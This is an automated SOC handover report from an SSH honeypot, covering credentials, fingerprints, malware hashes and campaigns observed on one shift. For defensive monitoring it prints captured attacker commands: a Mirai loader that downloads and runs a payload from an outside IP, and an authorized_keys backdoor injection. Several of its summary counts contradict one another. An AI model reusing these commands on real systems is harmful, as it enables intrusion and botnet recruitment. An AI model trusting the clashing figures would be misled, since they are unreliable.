# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-12 |
| **Generated At** | 2026-08-12T22:45:59Z |
| **Shift Time** | 22:45 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **191** |
| Confirmed Threats | **0** |
| False Positives Filtered | **191** (100.0%) |
| Unique Attacker IPs | **85** |
| Countries of Origin | **0** |
| High Severity Cases | **71** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **120** |
| Malware Samples Analyzed | **2** HIGH · **23** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **90** |
| Unique Credential Pairs | **49** |
| Unique Usernames | **9** |
| Unique Passwords | **46** |
| Successful Auth Pairs | **75** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 52 |
| `support` | 9 |
| `ubnt` | 7 |
| `admin` | 6 |
| `centos` | 5 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `666666` | 5 |
| `` | 5 |
| `jojo123` | 5 |
| `12345` | 5 |
| `support` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `666666` | 5 |
| `jojo` | `jojo123` | 5 |
| `support` | `12345` | 5 |
| `admin` | `` | 4 |
| `support` | `support` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `4321` | `195.178.110.217` | 2026-08-12T18:56:21 |
| `root` | `54321` | `195.178.110.217` | 2026-08-12T18:57:59 |
| `root` | `666666` | `10.0.0.73` | 2026-08-12T18:58:52 |
| `root` | `555555` | `195.178.110.217` | 2026-08-12T19:00:12 |
| `root` | `666666` | `74.208.177.56` | 2026-08-12T19:00:22 |
| `centos` | `11111111` | `10.0.0.73` | 2026-08-12T19:01:53 |
| `root` | `654321` | `195.178.110.217` | 2026-08-12T19:03:33 |
| `support` | `support` | `10.0.0.73` | 2026-08-12T19:04:08 |
| `root` | `7777777` | `195.178.110.217` | 2026-08-12T19:05:13 |
| `root` | `Admin2026!` | `195.178.110.217` | 2026-08-12T19:06:45 |
| `root` | `P4ssw0rd` | `195.178.110.217` | 2026-08-12T19:08:16 |
| `root` | `P4ssword` | `195.178.110.217` | 2026-08-12T19:09:53 |
| `root` | `P@ssw0rd` | `195.178.110.217` | 2026-08-12T19:11:19 |
| `root` | `P@ssw0rd2026` | `195.178.110.217` | 2026-08-12T19:12:53 |
| `admin` | `qwerty01` | `144.22.210.132` | 2026-08-12T19:13:04 |
| `admin` | `qwerty01` | `62.91.108.146` | 2026-08-12T19:13:12 |
| `root` | `P@ssword` | `195.178.110.217` | 2026-08-12T19:14:32 |
| `support` | `support` | `176.53.159.196` | 2026-08-12T19:14:59 |
| `root` | `666666` | `178.178.222.58` | 2026-08-12T19:16:28 |
| `root` | `666666` | `111.70.32.10` | 2026-08-12T19:16:38 |
| `root` | `Passw0rd` | `195.178.110.217` | 2026-08-12T19:16:47 |
| `centos` | `11111111` | `41.220.3.101` | 2026-08-12T19:18:50 |
| `root` | `Password1` | `195.178.110.217` | 2026-08-12T19:21:14 |
| `root` | `Root123` | `195.178.110.217` | 2026-08-12T19:23:01 |
| `ubnt` | `Passw@rd` | `200.105.141.172` | 2026-08-12T19:23:58 |
| `root` | `abc123` | `195.178.110.217` | 2026-08-12T19:24:57 |
| `root` | `admin` | `195.178.110.217` | 2026-08-12T19:27:45 |
| `jojo` | `jojo123` | `10.0.0.73` | 2026-08-12T19:28:23 |
| `root` | `alpine` | `195.178.110.217` | 2026-08-12T19:31:08 |
| `root` | `123@@@` | `144.22.238.238` | 2026-08-12T19:31:20 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-08-12T19:31:20 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-08-12T19:31:23 |
| `ubnt` | `00` | `10.0.0.73` | 2026-08-12T19:32:53 |
| `root` | `changeme` | `195.178.110.217` | 2026-08-12T19:34:12 |
| `ubnt` | `00` | `12.150.243.22` | 2026-08-12T19:34:17 |
| `ubnt` | `00` | `65.20.143.45` | 2026-08-12T19:34:24 |
| `ubnt` | `Passw@rd` | `10.0.0.73` | 2026-08-12T19:35:32 |
| `root` | `default` | `195.178.110.217` | 2026-08-12T19:36:10 |
| `root` | `` | `94.154.43.140` | 2026-08-12T19:38:05 |
| `root` | `letmein` | `195.178.110.217` | 2026-08-12T19:39:27 |
| `root` | `admin` | `94.154.43.99` | 2026-08-12T19:39:53 |
| `root` | `123@@@` | `129.153.145.135` | 2026-08-12T19:41:55 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-08-12T19:41:56 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-08-12T19:42:02 |
| `root` | `p4ssword` | `195.178.110.217` | 2026-08-12T19:44:34 |
| `root` | `passw0rd` | `195.178.110.217` | 2026-08-12T19:46:23 |
| `jojo` | `jojo123` | `196.219.93.98` | 2026-08-12T19:46:40 |
| `jojo` | `jojo123` | `122.160.15.31` | 2026-08-12T19:46:54 |
| `jojo` | `jojo123` | `59.93.36.136` | 2026-08-12T19:46:56 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-12T19:47:40 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-12T19:47:41 |
| `root` | `password` | `195.178.110.217` | 2026-08-12T19:48:33 |
| `root` | `qwerty` | `195.178.110.217` | 2026-08-12T19:51:17 |
| `ubnt` | `Passw@rd` | `197.242.170.10` | 2026-08-12T19:52:37 |
| `root` | `qwerty123456` | `195.178.110.217` | 2026-08-12T19:56:24 |
| `support` | `12345` | `151.237.170.49` | 2026-08-12T19:57:47 |
| `support` | `12345` | `223.99.212.58` | 2026-08-12T19:57:55 |
| `root` | `r00t` | `195.178.110.217` | 2026-08-12T20:02:43 |
| `root` | `﻿------fuck------` | `120.71.149.171` | 2026-08-12T20:06:07 |
| `support` | `12345` | `10.0.0.73` | 2026-08-12T20:09:21 |
| `root` | `root!@#` | `195.178.110.217` | 2026-08-12T20:13:53 |
| `root` | `root#123` | `195.178.110.217` | 2026-08-12T20:19:06 |
| `guest` | `guest888` | `122.187.234.54` | 2026-08-12T20:20:40 |
| `guest` | `guest888` | `95.35.29.192` | 2026-08-12T20:20:47 |
| `root` | `aladin` | `77.90.185.20` | 2026-08-12T20:22:07 |
| `root` | `hekmqGYKkk` | `110.42.136.59` | 2026-08-12T20:23:15 |
| `23` | `root` | `94.154.43.140` | 2026-08-12T20:23:56 |
| `support` | `12345` | `197.156.97.198` | 2026-08-12T20:26:31 |
| `centos` | `159753` | `177.174.0.3` | 2026-08-12T20:31:56 |
| `centos` | `159753` | `208.96.233.67` | 2026-08-12T20:32:07 |
| `debian` | `alpine` | `10.0.0.73` | 2026-08-12T20:37:35 |
| `root` | `LeitboGi0ro` | `140.245.50.204` | 2026-08-12T20:38:44 |
| `root` | `123@@@` | `140.245.50.204` | 2026-08-12T20:38:44 |
| `debian` | `alpine` | `50.188.204.213` | 2026-08-12T20:39:07 |
| `debian` | `alpine` | `197.211.32.242` | 2026-08-12T20:39:14 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **191** |
| Sessions with Fingerprint | **13** |
| Unique HASSH Fingerprints | **13** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 43 |
| OpenSSH | 25 |
| Paramiko (Python) | 14 |
| libssh | 8 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 29 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 25 | 25 |
| `a2de0f306611...` | Mirai/variant | 12 | 4 |
| `0a07365cc01f...` | Generic scanner | 5 | 1 |
| `f1e5e9d24e5e...` | Mirai/variant | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 29 | 1 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 25 | 25 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 12 | 4 | Mirai/variant |
| `95420f9d932d...` | libssh | 8 | 3 | — |
| `0a07365cc01f...` | Go SSH scanner | 5 | 1 | Generic scanner |
| `f1e5e9d24e5e...` | Go SSH scanner | 2 | 1 | Mirai/variant |
| `a704be057881...` | Paramiko (Python) | 2 | 1 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **5** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 28 | 1 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1070, T1140, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `195.178.110.217`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
sh
```
```
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /dev/shm || cd /; wget -q http://83.168.69.141/armv7l -O armv7l || curl -s -o armv7l http://83.168.69.141/armv7l || busybox wget -q -O armv7l http://83.168.69.141/armv7l; chmod +x armv7l; ./armv7l; tftp -g -r tftp1.sh 83.168.69.141; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c
```
Source IPs: `94.154.43.140`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1h
```
Source IPs: `77.90.185.20`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **85** |
| Unique ASNs | **64** |
| High-Risk ASNs | **0** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS31898` | Oracle Corporation | 5 | LOW |
| `AS398324` | Censys, Inc. | 4 | LOW |
| `AS4134` | CHINANET BACKBONE | 3 | LOW |
| `AS63949` | Akamai Connected Cloud | 3 | LOW |
| `AS46562` | Performive LLC | 3 | LOW |
| `AS7303` | Telecom Argentina S.A. | 2 | LOW |
| `AS7018` | AT&T Enterprises, LLC | 2 | LOW |
| `AS219502` | Storm Industries LLC | 2 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (0)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

_No priority cases this shift. All confirmed sessions were credential scans only._

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

_No reconnaissance sessions this shift._

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **33/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 41/100 | 🟡 MEDIUM | **29/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 59/100 | 🟡 MEDIUM | **24/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **26/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

_No enriched IPs with abuse scores available._

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 91 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 71 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 31 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 31 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 28 |

---

## 🔕 False Positive Summary (191 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 191 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 191 cases |
| Tool 34  | Credential Extractor        | ✅ 90 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 13 fingerprints |
| Tool 36  | Command Clustering          | ✅ 5 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 85 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 191 filtered (100.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 64 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 21 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 0 priority case(s) shown individually · 0 recon entry/entries in table (0 group(s) consolidating 0 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-12T22:45:59Z_
